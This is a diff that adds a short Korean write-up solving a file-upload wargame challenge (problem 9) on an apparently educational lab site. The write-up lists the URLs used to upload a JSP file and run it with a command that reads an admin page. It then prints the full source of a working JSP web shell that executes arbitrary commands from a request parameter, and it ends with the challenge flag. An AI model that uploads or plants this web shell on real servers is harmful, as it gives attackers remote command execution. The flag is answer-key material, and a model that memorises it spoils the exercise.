@@ -1,0 +1,40 @@
+================================
+* 파일 업로드 워게임 문제 9번
+================================
+
+1. 코드
+https://lab.eqst.co.kr:8440/data/download.jsp?filePath=/files/qna/20251029/&fileName=9fbee45d-d183-4137-8577-ccc52f04b0ab.jsp&orgFileName=jsp_lms_webshell.jsp
+
+https://lab.eqst.co.kr:8440/data/files/qna/20251029/9fbee45d-d183-4137-8577-ccc52f04b0ab.jsp
+
+https://lab.eqst.co.kr:8440/data/files/qna/20251029/9fbee45d-d183-4137-8577-ccc52f04b0ab.jsp?cmd=nl%20webapps/admin_site/admin_super.jsp
+2. 사용한 웹쉘 코드
+
+<%@ page import="java.util.*,java.io.*"%>
+
+<HTML><BODY>
+<FORM METHOD="GET" NAME="webshell" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+
+3. 정답
+webshell_is_bad
+================================
